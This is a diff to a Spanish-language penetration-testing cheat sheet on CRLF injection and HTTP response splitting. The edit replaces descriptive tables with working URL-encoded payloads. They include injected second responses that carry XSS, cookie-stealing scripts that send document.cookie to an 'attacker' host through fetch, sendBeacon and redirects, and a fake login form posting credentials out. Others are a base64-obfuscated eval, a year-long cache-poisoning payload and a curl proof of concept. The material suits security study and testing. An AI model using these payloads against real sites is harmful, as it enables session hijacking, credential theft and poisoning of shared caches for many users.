@@ -8,118 +8,87 @@ tags:
   - vuln/crlf-injection
   - technique/initial-access
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[CRLF Injection]]"
-  - "[[Cross-Site Scripting (XSS)]]"
+  - '[[CRLF Injection]]'
+  - '[[Cross-Site Scripting (XSS)]]'
 ---
 # CRLF Injection - HTTP Response Splitting
 
 ***
 
-## Split Single Response en Two
+## Split — Forzar fin de headers + segunda respuesta
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload (param URL)** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Two CRLF terminate headers | `\r\n\r\n` separa headers de body | Standard HTTP. |
-| Atacante injects `\r\n\r\n` mid-headers | Server's body becomes "second response start" | Splitting. |
-| Encoding | `%0d%0a%0d%0a` URL-encoded | Standard. |
-| Body inject continues | Whatever follows interpretado as new HTTP response | Atacante controls. |
-| Multiple responses confused | Browser/proxy may interpret either | Per-stack. |
-| Cache poisoning combine | Cached response stores poisoned headers + body | Mass impact. |
-| Combine con HRS | Smuggle vector via splitting | Multi-vector. |
-| Force second response | Atacante's body has new status line | Two distinct responses. |
-| Browser behavior | Browser may render second response | XSS chain. |
-| Proxy / cache behavior | Proxy may forward both | Per-config. |
-| HTTP/1.1 only viable | HTTP/2 binary framing prevents text-based splitting | H1 specific. |
-| Modern mitigations | Most servers reject `%0d%0a` en headers now | Defense baseline. |
+| `?url=ok%0d%0a%0d%0a<html>SPLIT</html>` | `\r\n\r\n` cierra headers → body atacante reflejado | Test mínimo de splitting viable. |
+| `?url=ok%0d%0aContent-Length:%2026%0d%0a%0d%0a<html>SPLIT-MARKER</html>` | Body delimitado por `Content-Length` correcta | Splitting con Content-Length pre-calculada. |
+| `?url=ok%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>poison</h1>` | Status-line + headers + body de segunda respuesta completa | Pipeline HTTP/1.1, proxy pre-cache. |
+| `?url=ok%0d%0aSet-Cookie:%20a=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<x>` | Set-Cookie + segunda respuesta combinadas | Multi-effect en una sola injección. |
 ^crlfi-split-twores
 
 ___
 
 ## Inject Second Response con HTML/JS
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload (segunda respuesta inyectada)** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Full HTTP response inject | `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>...</html>` | Complete response. |
-| Status line | `HTTP/1.1%20200%20OK` | New status. |
-| Content-Type | `Content-Type:%20text/html` | Force HTML render. |
-| Content-Length | `Content-Length:%20<N>` | Match body length. |
-| Body con XSS | `<script>alert(document.cookie)</script>` | XSS. |
-| Body con phishing | Fake login form | Phishing. |
-| Body con malware redirect | Auto-download | Drive-by. |
-| Body con persistent JS | `<script src="//attacker/c2.js">` | C2. |
-| Combine con cache poisoning | Cache stores split response | Mass victim. |
-| Stored XSS via cache | Persistent | Long-lived. |
-| Cookie-stealing JS | `<script>fetch('//attacker/?c='+document.cookie)</script>` | Direct theft. |
-| Combine con SOP confusion | Browsers handle differently | Edge. |
-| Modern defenses | Most servers prevent splitting now | Detection. |
-| HTTP/1.0 vs HTTP/1.1 | Subtly different parsing | Edge. |
+| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<script>alert(document.domain)</script>` | XSS ejecutado del dominio víctima | PoC clásico XSS via splitting. |
+| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>fetch('//attacker/?c='+document.cookie)</script>` | Cookie exfil hacia atacante | XSS con cookie theft. |
+| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<form action="//attacker/log" method=post><input name=u><input name=p><button>Login</button></form>` | Form phishing en dominio víctima | Phishing con HTTPS válido. |
+| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<meta http-equiv="refresh" content="0;url=//attacker">` | Redirección forzada | Sin JS — cumple CSP `script-src 'none'`. |
+| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<iframe src="//attacker/c2.html" style="position:fixed;width:100%;height:100%"></iframe>` | UI Overlay / clickjacking persistente | Stored vía cache poisoning. |
 ^crlfi-split-secondres
 
 ### PoC HTTP Response Splitting
 
 ```bash
-# Atacante's payload (URL-encoded):
 PAYLOAD='ok%0d%0aSet-Cookie:atacante=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20100%0d%0a%0d%0a<html><body><script>alert(document.cookie)</script></body></html>'
 
-# Send request
 curl -i "https://target.com/redirect?url=$PAYLOAD"
 
 # Server response (raw):
-HTTP/1.1 302 Found
-Location: ok
-Set-Cookie: atacante=1                  ← injected header
-
-HTTP/1.1 200 OK                          ← injected response start
-Content-Type: text/html
-Content-Length: 100
-
-<html><body><script>alert(document.cookie)</script></body></html>
-
-# Browser interprets second response → XSS executes
-# Or proxy/cache stores split response → mass victim impact
+# HTTP/1.1 302 Found
+# Location: ok
+# Set-Cookie: atacante=1                  ← inyectada
+#
+# HTTP/1.1 200 OK                         ← segunda respuesta inyectada
+# Content-Type: text/html
+# Content-Length: 100
+#
+# <html><body><script>alert(document.cookie)</script></body></html>
+#
+# Browser interpreta segunda respuesta → XSS ejecuta.
+# Proxy/cache puede almacenar split response → impacto masivo.
 ```
 
 ___
 
 ## XSS via Response Splitting
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload XSS embebido en split** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Inject `<script>` body | Standard XSS payload en split body | Direct. |
-| Steal cookies | `<script>fetch('//attacker/?c='+document.cookie)</script>` | Combine. |
-| Persistent via cache | Cache stores XSS body | Mass impact. |
-| Bypass CSP | If CSP injected en split → atacante controls policy | Combine. |
-| Combine con OAuth | OAuth flow with response splitting | Federated XSS. |
-| Combine con login redirect | Atacante redirects victim → split response → XSS | Multi-step. |
-| Storage XSS via cache | TTL-bound persistencia | Standard. |
-| Reflected XSS via cache | Per-URL cached response | Persistent. |
-| Combine con HRS | Smuggle response with XSS body | Compound. |
-| HTML5 features | `<form>` con auto-submit | No JS XSS. |
-| `<iframe srcdoc>` | Inline iframe content | Sandboxed XSS. |
-| postMessage exploitation | Cross-frame XSS | Edge. |
+| `<script>document.location='//attacker/?c='+document.cookie</script>` | Cookie steal + redirección | XSS clásico con exfil. |
+| `<script>navigator.sendBeacon('//attacker/log',document.cookie)</script>` | Exfil silenciosa (beacon survives navigate) | Stealth. |
+| `<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>"></iframe>` | Bypass CSP `script-src` mediante srcdoc | App con CSP que permite frames. |
+| `<svg onload=fetch('//attacker/?c='+document.cookie)>` | XSS sin `<script>` — bypass blacklist | WAF filtra `<script>`. |
+| `<script>eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIvP2M9JytkLm…'))</script>` | Payload base64 ofuscado | WAF filtra strings literales. |
 ^crlfi-split-xss
 
 ___
 
 ## Cache Poisoning via Splitting
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Combinación** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Cache stores split response | Cache key normal, response includes split | Mass victim. |
-| Persistencia por TTL | All users hit cache → see XSS body | Standard. |
-| Bypass TTL via long max-age | Atacante injects cache-control | Compound. |
-| Combine con WCP | Web Cache Poisoning + CRLF splitting | Multi-vector chain. |
-| Multi-tier cache propagation | CDN + proxy + origin | Cascading. |
-| Combine con HRS | Smuggle response + cache | Most powerful chain. |
-| Selective targeting | Cache key per-region/user | Limited reach. |
-| HTTP/2 considerations | Cache behavior differs | Per-stack. |
-| Detection | Same URL different responses indicates poisoning | Audit. |
-| Time-window | Atacante chooses peak traffic for max impact | Operational. |
+| `%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0a%0d%0a<html>XSS</html>` | Cache guarda response con XSS body por 1 año | CDN/proxy honra cache-control. |
+| Inyectar split en parámetro **unkeyed** (header reflejado pero no en cache key) | Cache poisoning con clave normal — todas las víctimas ven XSS | Web Cache Poisoning clásico via CRLF. |
+| Combinar con `X-Forwarded-Host` / `X-Host-Override` inyectados | Cache poisoning + Host Header Injection | Multi-vector. |
+| Split + `Vary: User-Agent` removido | Forzar single cache entry para todos los UAs | Maximizar alcance. |
+| Split en endpoint cacheable (`/static/*`, `/api/public/*`) | Persistencia hasta TTL expiration | Identificar surface cacheable previo. |
 ^crlfi-split-cache
 
 ***
